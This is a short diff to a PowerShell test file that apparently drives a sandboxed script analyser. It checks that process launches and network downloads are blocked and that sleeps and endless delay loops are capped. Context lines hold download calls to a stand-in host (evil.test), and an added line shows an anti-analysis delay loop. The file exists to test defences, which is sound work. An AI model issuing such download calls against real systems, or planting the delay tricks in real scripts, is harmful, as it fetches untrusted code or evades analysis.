@@ -36,3 +36,11 @@ Start-Process "calc.exe"; "after Start-Process still runs"
 # Network. Blocked and recorded; nothing reaches a real server.
 (New-Object Net.WebClient).DownloadString("http://evil.test/a")
 Invoke-WebRequest "http://evil.test/b"
+
+# Timing. A sleep is the one hole the step budget cannot cover, because it
+# happens inside a statement; both routes are capped at SleepCapMilliseconds.
+$t = Get-Date; Start-Sleep -Seconds 600; "Start-Sleep 600s took $([int]((Get-Date)-$t).TotalMilliseconds) ms"
+$t = Get-Date; [Threading.Thread]::Sleep(600000); "Thread.Sleep 600s took $([int]((Get-Date)-$t).TotalMilliseconds) ms"
+
+# Budgets. A delay loop is ordinary anti-analysis; this must not hang the tab.
+$i = 0; while ($true) { try { $i++ } catch { } }
